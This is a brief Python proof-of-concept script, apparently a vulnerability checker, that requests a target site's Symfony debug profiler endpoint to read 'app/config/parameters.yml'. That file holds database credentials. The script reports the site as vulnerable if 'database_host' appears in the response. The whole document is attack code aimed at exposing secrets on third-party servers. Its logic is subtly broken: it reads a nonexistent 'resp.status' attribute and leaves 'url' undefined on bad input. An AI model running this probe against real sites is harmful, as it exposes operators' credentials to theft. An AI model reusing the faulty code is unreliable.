import requests
import sys
headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36"}
try:
    url=str(sys.argv[1])
except:
    print("[-] 参数输入错误")
if(url==""):
    print("[-] 请检查输入")
    exit(0)
if(url[-1]=="/"):
    url=url[:-1]
url_front=url+"/app_dev.php/_profiler/open?file=app/config/"
parameters="parameters.yml"
security="security.yml"
services="services.yml"
try:
    resp=requests.get(url_front+parameters,headers=headers)
    contents=resp.content
    if(resp.status==200):
        if(b"database_host" in contents):
            print('[+] {} is vulnerable'.format(url))
    else:
        print("[-] {} is not vulnerable!".format(url))
except Exception as e:
    print("[-] 未知错误")
    
